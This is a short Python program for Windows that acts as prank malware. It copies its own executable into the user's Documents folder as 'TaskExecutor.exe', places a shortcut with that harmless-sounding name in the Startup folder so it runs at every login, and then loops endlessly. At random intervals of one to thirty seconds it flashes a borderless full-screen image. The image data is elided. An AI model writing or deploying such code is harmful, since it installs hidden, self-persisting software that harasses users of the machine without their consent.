import tkinter as tk
from PIL import Image, ImageTk
import base64, time, random, os, shutil, sys, subprocess, winshell
from io import BytesIO

#list of images in base64 format
images = [
"""...""",""""..."""
]

def show_and_disappear(img_str, duration):
    root = tk.Tk()
    root.overrideredirect(True)

    img_data = base64.b64decode(img_str)
    image = Image.open(BytesIO(img_data))

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    window_width = screen_width #// 2
    window_height = screen_height #// 2

    image = image.resize((window_width, window_height), Image.LANCZOS)
    photo = ImageTk.PhotoImage(image)

    label = tk.Label(root, image=photo)
    label.pack()

    root.geometry("{}x{}+{}+{}".format(
        window_width,
        window_height,
        screen_width // 2 - window_width // 2,
        screen_height // 2 - window_height // 2
    ))

    root.after(duration, lambda: root.destroy())
    root.mainloop()

def copy_self(path):
    exe_path = sys.executable
    try:
        shutil.copy(exe_path, path)
    except Exception as e:
        sys.exit()

def add_to_startup(path):
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = os.path.join(startup_folder, 'TaskExecutor.lnk')
    with winshell.shortcut(shortcut_path) as shortcut:
        shortcut.path = path
        shortcut.description = "TaskExecutor"


if __name__ == "__main__":
    POPUP_DURATION = 200
    MIN_TIME = 1 
    MAX_TIME = 30
    EXE_DEST_PATH = os.path.join(os.environ['USERPROFILE'], 'Documents','TaskExecutor.exe')
    
    if not os.path.exists(EXE_DEST_PATH):
        copy_self(EXE_DEST_PATH)
        add_to_startup(EXE_DEST_PATH)

        subprocess.Popen([EXE_DEST_PATH], shell=True)
        sys.exit()

    else:
        while True:
            # Time range in which the image will be shown
            time.sleep(random.randint(MIN_TIME, MAX_TIME))
            show_and_disappear(images[random.randint(0, len(images)-1)], POPUP_DURATION)
        